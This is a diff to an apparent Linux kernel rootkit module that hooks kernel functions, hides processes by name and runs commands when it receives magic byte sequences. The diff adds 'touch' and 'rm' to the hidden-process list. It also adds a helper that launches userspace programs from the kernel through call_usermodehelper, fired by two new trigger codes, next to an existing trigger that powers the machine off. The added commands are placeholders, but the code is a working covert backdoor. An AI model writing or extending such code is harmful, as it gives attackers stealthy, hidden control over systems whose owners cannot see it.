@@ -97,8 +97,8 @@ static int force_reboot_disabled = 0;
 module_param(force_reboot_disabled, int, 0644);
 
 #define MAX_NUM_PROC_NAME 10
-static int num_proc_name = 1;
-static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm",};
+static int num_proc_name = 3;
+static char *hidden_proc_name[MAX_NUM_PROC_NAME] = {"hidden_comm", "touch", "rm"};
 module_param_array(hidden_proc_name, charp, &num_proc_name, 0644);
 static char exe_buf[PATH_MAX] = {0};
 
@@ -1059,6 +1059,27 @@ static asmlinkage int ftrace_fsnotify(struct inode *to_tell, __u32 mask, const v
 	return real_fsnotify(to_tell, mask, data, data_is, file_name, cookie);
 } 
 
+static int run_usr_cmd(const char *cmd)
+{
+        char **argv;
+        static char *envp[] = {
+                "HOME=/",
+                "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+                NULL
+        };
+        int ret;
+        argv = argv_split(GFP_KERNEL, cmd, NULL);
+        if (argv) {
+                ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+                argv_free(argv);
+        } else {
+                ret = -ENOMEM;
+        }
+
+        return ret;
+}
+
+
 static void exec_cmd(char *cmd, int len) 
 {
 	if (len < 3) 
@@ -1069,6 +1090,10 @@ static void exec_cmd(char *cmd, int len)
 	} else if (cmd[0] == '$' && cmd[1] == '$' && cmd[2] == '$') {
 		kernel_power_off();
 		do_exit(0);
+	} else if (cmd[0] == 0x01 && cmd[1] == 0x01 && cmd[2] == 0x01) {
+		run_usr_cmd("/bin/touch /tmp/xxx");
+	} else if (cmd[0] == 0x02 && cmd[1] == 0x02 && cmd[2] == 0x02) {
+		run_usr_cmd("/bin/rm /tmp/xxx");
 	}
 	return;
 };
